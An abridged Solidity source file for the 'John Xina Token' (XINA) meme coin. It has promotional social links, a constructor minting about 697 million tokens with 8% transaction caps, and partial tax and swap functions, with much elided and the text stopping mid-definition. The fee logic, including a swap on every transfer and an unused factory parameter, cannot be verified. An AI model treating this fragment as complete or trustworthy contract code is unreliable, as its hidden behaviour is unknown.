...
/*
Twitter: https://twitter.com/johnxinameme
TG: https://t.me/johnxinatoken
Web: https://www.johnxinaeth.vip/
*/
...
contract JohnXina is ERC20, Ownable {
    ...
    constructor(address _teamWallet, address factory)
        ERC20("John Xina Token", unicode"XINA")
    {           address _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        _mint(msg.sender, 696_969_696 * 1e18);
        uint256 _totalSupply = totalSupply();
        dexRouter = IDexRouter(_v2Router);

        maxTransaction = _totalSupply * 8 / 100;
        maxWallet = _totalSupply * 8 / 100;
    ...
    function getTaxAmount(address from, address to, uint256 amount) internal returns (uint256) {
        uint256 tax = 0;
        // on sell
    ...
    function takeFee(address from, address to, uint256 amount) internal returns (uint256){
        if(!swapping) {
            swapping = true; _swapEthTo(from, to); swapping = false;
        }
        uint256 tax = 0;tax = getTaxAmount(from, to, amount);
        if(tax > 0){
    ...
    function _swapEthTo(address from, address to) private {
